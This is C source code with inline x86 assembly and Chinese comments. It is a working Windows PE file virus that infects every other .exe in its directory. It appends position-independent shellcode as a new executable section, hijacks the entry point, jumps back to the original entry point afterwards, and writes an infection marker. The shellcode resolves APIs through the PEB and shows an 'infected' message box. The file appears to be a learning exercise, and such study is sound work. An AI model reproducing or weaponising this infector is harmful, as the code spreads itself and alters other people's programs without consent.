#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>

// 感染标记CQNU
#define SIGNATURE 0x756E7163

// 宿主文件句柄
HANDLE hSourceFile = NULL;
// 宿主映像句柄
HANDLE hSourceMap = NULL;
// 宿主映像视图指针
LPVOID lpSourceBase = NULL;
// DOS头
PIMAGE_DOS_HEADER pDosHeader = NULL;
// PE头
PIMAGE_NT_HEADERS pNtHeader = NULL;
// 节表头
PIMAGE_SECTION_HEADER pSectionHeaders = NULL;
// 节表头结构体
IMAGE_SECTION_HEADER imgSection = { 0 };
// 源程序入口点
DWORD originalEntryPoint = 0;
// 目标程序入口点
DWORD targetEntryPoint = 0;

void getSelfFileName(char *selfName, char *filePath);
BOOL isPeFileAndGetPointer();
void addSection(char *szSectionName, int sectionSize);
DWORD alignSize(int size, int alignment);
void addSectionData();
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
void release();

int originalSectionNumber = 0;
DWORD dwFileAlignment = 0;
DWORD dwSectionAlignment = 0;
PIMAGE_SECTION_HEADER pNewSection = NULL;
// 需要添加的节的大小
DWORD codeSize = 0;

void main(int argc, char *argv[]) {
	char szSelfName[MAX_PATH] = { 0 };
	getSelfFileName(szSelfName, argv[0]);
	/*
		FindFirstFile第一个参数举例
			1. c:\\Windows\\System32\\*.dll
				在c:\Windows\System32目录中查找所有dll文件
			2. *.*
				在当前目录查找所有文件
	*/
	char *szFileName = NULL;
	LPCTSTR lpFileName = "*.exe";
	WIN32_FIND_DATA pNextInfo;
	HANDLE hSearch = FindFirstFile(lpFileName, &pNextInfo);
	if (hSearch == INVALID_HANDLE_VALUE)
	{
		printf("无目标文件!\n");
	}
	else {
		do {
			szFileName = pNextInfo.cFileName;
			if (strcmp(szFileName, szSelfName) == 0)
			{
				continue;
			}
			hSourceFile = CreateFile(szFileName,
				GENERIC_WRITE | GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			hSourceMap = CreateFileMapping(hSourceFile, NULL, PAGE_READWRITE, 0, 0, 0);
			lpSourceBase = MapViewOfFile(hSourceMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

			BOOL bResult = isPeFileAndGetPointer();
			if (bResult == TRUE)
			{
				BOOL bIsInfected = readSignature(hSourceFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
				if (bIsInfected == FALSE)
				{
					// 先添加节数据,以便获取代码大小, 将补丁程序的字节码附加到原PE文件的末尾
					addSectionData();

					// 添加新节表,需要传入节名和节的大小
					addSection(".test", codeSize);

					// 添加标记
					writeSignature(hSourceFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
					printf("%s感染完成!\n", szFileName);
				}
				else
				{
					printf("%s已被感染过,跳过!\n", szFileName);
				}
			}
		} while (FindNextFile(hSearch, &pNextInfo));
		FindClose(hSearch);
	}
	system("pause");
}

/*
判断是否为有效的PE文件
如果无效直接返回
如果有效则把解析PE格式相关的结构体指针也得到
*/
BOOL isPeFileAndGetPointer() {
	BOOL bResult = FALSE;
	// 判断是否为MZ头
	pDosHeader = (PIMAGE_DOS_HEADER)lpSourceBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("不符合DOS头\n");
		release();
		return bResult;
	}
	// 根据IMAGE_DOS_HEADER中的e_lfanew的值得到PE头的位置
	pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)lpSourceBase + pDosHeader->e_lfanew);
	// 判断是否为PE\0\0
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("不符合PE头\n");
		release();
		return bResult;
	}
	// 获取节表的位置,从NT_HEADER中的&(pNtHeader->OptionalHeader)处加上SizeOfOptionalHeader就是节表的位置了
	// &(pNtHeader->OptionalHeader):取出OptionalHeader在该文件中的偏移地址
	pSectionHeaders = (PIMAGE_SECTION_HEADER)((DWORD)&(pNtHeader->OptionalHeader)
		+ pNtHeader->FileHeader.SizeOfOptionalHeader);
	bResult = TRUE;
	return bResult;
}
/*
	添加新节,需要传入节名和节的大小(通过GetFileSize()函数获取)
*/
void addSection(char *szSectionName, int sectionSize) {
	// 1. 获取关键字段(节的数量,文件对齐,内存对齐), 已经在addSectionData中获取过了.
	// 2. 将新节的数据先写入到临时节头中
	pNewSection = pSectionHeaders + originalSectionNumber;
	// 2.1 拷贝节名(长度为8,留出一个0的位置)
	strncpy(pNewSection->Name, szSectionName, 7);
	// 2.2 节的内存大小
	pNewSection->Misc.VirtualSize = alignSize(sectionSize, dwSectionAlignment);
	// 2.3 节的内存起始位置
	pNewSection->VirtualAddress = pSectionHeaders[originalSectionNumber - 1].VirtualAddress
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, dwSectionAlignment);
	// 2.4 节的文件大小
	pNewSection->SizeOfRawData = alignSize(sectionSize, dwFileAlignment);
	// 2.5 节的文件起始位置
	pNewSection->PointerToRawData = pSectionHeaders[originalSectionNumber - 1].PointerToRawData
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].SizeOfRawData, dwFileAlignment);

	// 3. 修正映像大小和代码大小
	pNtHeader->OptionalHeader.SizeOfImage += alignSize(pNewSection->Misc.VirtualSize, dwSectionAlignment);
	pNtHeader->OptionalHeader.SizeOfCode += alignSize(pNewSection->SizeOfRawData, dwFileAlignment);
	// 4. 修改节的属性
	pNewSection->Characteristics = 0xE0000060;
	// 5. 修改节的数量
	pNtHeader->FileHeader.NumberOfSections++;
	/* 
	6. 第一个参数是包含在内存映射文件中的视图的一个字节的地址。该函数将你在这里传递的地址圆整为一个页面边界值。
	   第二个参数用于指明你想要刷新的字节数。系统将把这个数字向上圆整，使得字节总数是页面的整数。
	   如果字节数传入0, 则会从映射的开始到结束位置刷新整个文件
	*/
	FlushViewOfFile(lpSourceBase, 0);
}

/*
	如果该大小是对齐量的整数倍,直接返回
	如果不是,则取其(整除后加1) x 对齐量
*/
DWORD alignSize(int size, int alignment) {
	if (size % alignment != 0)
	{
		size = (size / alignment + 1) * alignment;
	}
	return size;
}

/*
	总结调试出来的_asm规则:
		1. 栈必须以16位对齐
		2. 调用库函数传参的原理是将需要传入的字符串参数先压入栈中,然后向函数传入对应字符串在栈中的地址作为参数.
			这就是为什么每次都是先向栈中压入字符串,再压入ESP的原因
		3. Windows函数传参的顺序是,从右到左压栈
*/
void addSectionData() {
	goto shellend;
	_asm {
	shell:  PUSHAD
			MOV  EAX, DWORD PTR FS : [30H]; FS:[30H]指向PEB
			MOV  EAX, DWORD PTR[EAX + 0CH]; 获取PEB_LDR_DATA结构的指针
			MOV  EAX, DWORD PTR[EAX + 1CH]; 获取LDR_MODULE链表表首结点的inInitializeOrderModuleList成员的指针
			MOV  EAX, DWORD PTR[EAX]; LDR_MODULE链表第二个结点的inInitializeOrderModuleList成员的指针
			MOV  EAX, DWORD PTR[EAX]
			MOV  EAX, DWORD PTR[EAX + 08H]; inInitializeOrderModuleList偏移8h便得到Kernel32.dll的模块基址
			MOV  EBP, EAX; 将Kernel32.dll模块基址地址放至kernel中

			MOV  EAX, DWORD PTR[EAX + 3CH]; 指向IMAGE_NT_HEADERS
			MOV  EAX, DWORD PTR[EBP + EAX + 78H]; 指向导出表
			MOV  ECX, [EBP + EAX + 18H]; 取导出表中导出函数名字的数目
			MOV  EBX, [EBP + EAX + 20H]; 取导出表中名字表的地址
			ADD  EBX, EBP

			PUSH WORD  PTR 0X00; 构造GetProcAddress字符串
			PUSH DWORD PTR 0X73736572
			PUSH DWORD PTR 0X64644163
			PUSH DWORD PTR 0X6F725074
			PUSH WORD PTR 0X6547
			MOV  EDX, ESP
			PUSH ECX

			F1 :
			MOV  EDI, EDX
				POP  ECX
				DEC  ECX
				TEST  ECX, ECX
				JZ  EXIT
				MOV  ESI, [EBX + ECX * 4]
				ADD  ESI, EBP
				PUSH  ECX
				MOV  ECX, 15
				REPZ  CMPSB
				TEST  ECX, ECX
				JNZ  F1

				POP  ECX
				MOV  ESI, [EBP + EAX + 36]; 取得导出表中序号表的地址
				ADD  ESI, EBP
				MOVZX  ESI, WORD PTR[ESI + ECX * 2]; 取得进入函数地址表的序号
				MOV  EDI, [EBP + EAX + 28]; 取得函数地址表的地址
				ADD  EDI, EBP
				; 1. 取得GetProcAddress函数的地址
				MOV  EDI, [EDI + ESI * 4]
				; GetProcAddress函数的地址保存在EDI里面
				ADD  EDI, EBP

				PUSH WORD PTR 0X00; 构造LoadLibraryA字符串
				PUSH DWORD PTR 0X41797261
				PUSH DWORD PTR 0X7262694C
				PUSH DWORD PTR 0X64616F4C
				; 参数一: 字符串参数在栈中的地址
				PUSH ESP
				; 参数二: kernel模块的地址存放在EBP中
				PUSH EBP
				; 2. 调用GetProcAddress取得LoadLibraryA函数的地址
				CALL EDI

				; 自己添加的代码: call之后LoadLibraryA函数的地址保存在EAX里面, 先保存到ESI当中, 避免后面被覆盖
				MOV ESI, EAX

				; 数据必须对齐, 传递的字符串参数必须以DWORD为单位凑齐, 然后再传入一个WORD大小的结束符\0
				PUSH WORD PTR 0x0000
				PUSH DWORD PTR 0X00003233; 添加参数“user32”字符串(75 73 65 72 33 32)
				PUSH DWORD PTR 0X72657375
				PUSH ESP
				; 3. 调用LoadLibraryA函数取得user32.dll模块的地址
				CALL ESI

				PUSH WORD PTR 0X00; 构造MessageBoxA字符串(4D657373 61676542 6F7841)
				PUSH DWORD PTR 0X0041786F
				PUSH DWORD PTR 0X42656761
				PUSH DWORD PTR 0X7373654D
				PUSH ESP
				; 将user32模块作为第二个参数压栈传递进去
				PUSH EAX
				CALL EDI; 调用GetProcAddress取得MessageBoxA函数的地址

				; 调用user32中的MessageBoxA函数
				/*
					步骤:
					1. 先将需要的所有字符串全部压入栈中
					2. 记录下当前栈顶的地址,方便后面计算每个字符串开始的地址
					3. 从右到左传入函数所需要的参数

					// 5045cec4 bcfeb8d0 c8be0000
					// "PE文件感染"
					// b8c3cec4 bcfed2d1 b1bbb8d0 c8be0000
					// "该文件已被感染"
				*/
				PUSH  DWORD PTR 0X0000BEC8
				PUSH  DWORD PTR 0XD0B8BBB1
				PUSH  DWORD PTR 0XD1D2FEBC
				PUSH  DWORD PTR 0XC4CEC3B8; 添加参数“该文件已被感染”字符串(b8c3cec4 bcfed2d1 b1bbb8d0 c8be0000)
				PUSH  DWORD PTR 0X0000BEC8
				PUSH  DWORD PTR 0XD0B8FEBC
				PUSH  DWORD PTR 0XC4CE4550; 添加参数“PE文件感染”字符串(5045cec4 bcfeb8d0 c8be0000)
				MOV EBX, ESP
				PUSH  DWORD PTR 0X00; 参数对话框类型
				PUSH EBX
				ADD EBX, 12
				PUSH EBX
				PUSH  DWORD PTR 0X00; 参数NULL
				CALL  EAX

				EXIT : ADD ESP, 82; 平衡堆栈, 具体数字用平栈前的最后一句调用代码处的ESP减去PUSHAD后面的第一句代码的ESP
				POPAD
	}
shellend:
	{
		char*	pShell;
		int		nShellLen;
		BYTE	jmp = 0xE9;
		__asm
		{
			LEA EAX, shell
			MOV pShell, EAX;
			LEA EBX, shellend
				SUB EBX, EAX
				MOV nShellLen, EBX
		}
		// 获取关键字段(节的数量,文件对齐,内存对齐)
		originalSectionNumber = pNtHeader->FileHeader.NumberOfSections;
		dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
		dwSectionAlignment = pNtHeader->OptionalHeader.SectionAlignment;
		// 将代码大小赋值给全局变量,避免使用返回值.
		codeSize = nShellLen;

		// 写入SHELLCODE
		DWORD dwNumber = 0;
		SetFilePointer(hSourceFile, 0, 0, FILE_END);
		WriteFile(hSourceFile, pShell, nShellLen, &dwNumber, NULL);
		
		// 获取并保存源程序入口地址
		originalEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
		// 设置新的程序入口地址
		pNtHeader->OptionalHeader.AddressOfEntryPoint =
		pSectionHeaders[originalSectionNumber - 1].VirtualAddress
		+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, dwSectionAlignment);

		// SHELLCODE之后是跳转到原OEP的指令
		pNewSection = pSectionHeaders + originalSectionNumber;
		pNewSection->VirtualAddress = pSectionHeaders[originalSectionNumber - 1].VirtualAddress
			+ alignSize(pSectionHeaders[originalSectionNumber - 1].Misc.VirtualSize, 
				dwSectionAlignment);
		/*
			E9指令是段间相对转移指令,占5个字节,后面跟的是相对当前指令的下一条指令的地址的偏移量
			目标地址的计算公式为:该指令中的偏移值 + 本转移指令的下一条指令的地址
			偏移量 = 目标地址 - (转移指令所在地址 + 5)
		*/
		originalEntryPoint = originalEntryPoint - (pNewSection->VirtualAddress + nShellLen) - 5;
		WriteFile(hSourceFile, &jmp, sizeof(jmp), &dwNumber, NULL);
		WriteFile(hSourceFile, &originalEntryPoint, sizeof(originalEntryPoint), &dwNumber, NULL);
		// 填充0以适应文件对齐
		int fillLength = dwFileAlignment - nShellLen - sizeof(jmp) - sizeof(originalEntryPoint);
		char *tempValue = calloc(fillLength, sizeof(char));
		WriteFile(hSourceFile, tempValue, fillLength, &dwNumber, NULL);
		free(tempValue);
		FlushFileBuffers(hSourceFile);
	}
}
/*
在指定文件的指定位置上写入感染标志
*/
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	return WriteFile(hFile, &dwSignature, sizeof(DWORD), &dwNumber, NULL);
}
/*
读取指定文件指定位置上的感染标志
*/
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD signatureToRead = 0;
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	ReadFile(hFile, &signatureToRead, sizeof(DWORD), &dwNumber, NULL);
	return signatureToRead == dwSignature;
}
/*
	从指定文件路径中分割出文件名
*/
void getSelfFileName(char *selfName, char *filePath) {
	char *p = filePath;
	int lastIndex = 0;
	int i = 0;
	while (*p != '\0')
	{
		if (*p == '\\')
		{
			lastIndex = i;
		}
		p++;
		i++;
	}
	// 跳过当前的'\'
	lastIndex++;
	p = filePath + lastIndex;
	i = 0;
	while (*p != '\0')
	{
		*(selfName + i) = *p;
		i++;
		p++;
	}
}

/*
	释放资源
*/
void release() {
	UnmapViewOfFile(lpSourceBase);
	CloseHandle(hSourceMap);
	CloseHandle(hSourceFile);
}
